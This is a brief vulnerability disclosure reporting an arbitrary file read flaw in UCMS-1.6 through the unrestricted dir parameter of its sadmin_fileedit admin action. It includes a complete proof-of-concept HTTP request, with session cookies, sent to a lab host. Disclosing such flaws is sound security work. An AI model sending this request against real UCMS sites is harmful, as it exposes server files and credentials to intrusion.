## UCMS-1.6 has arbitrary file reading vulnerabilities.

vendor: http://uuu.la/

Download link for UCMS-1.6 installation package: http://uuu.la/uploadfile/file/ucms_1.6.zip

When we look at the root directory of the website, we find that there is a 1.txt file, and the content of the txt file is hack by www

![image](https://user-images.githubusercontent.com/54017627/161383064-fab87b30-e8d9-4823-ab1a-654381701592.png)

![image](https://user-images.githubusercontent.com/54017627/161383097-533e44d1-5d37-4c84-b383-230c3edcaf32.png)

We send a request packet to read the file and change the parameter of dir to "/" to read the contents of the 1.txt file. There is no restriction on the parameter of dir here, which leads to the emergence of arbitrary file reading vulnerability.

```
GET /ucms_1.6/ucms/index.php?do=sadmin_fileedit&dir=/&file=1.txt HTTP/1.1
Host: 192.168.1.101
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.101/ucms_1.6/ucms/index.php?do=sadmin_file&dir=/ucms_1.6
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: admin_adc3f8=admin; psw_adc3f8=97376f13bb0b37ffdc31255d275d609c; token_adc3f8=8945ab62
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/161383175-a80d9c78-203e-404e-ab2e-c79c936f5e39.png)
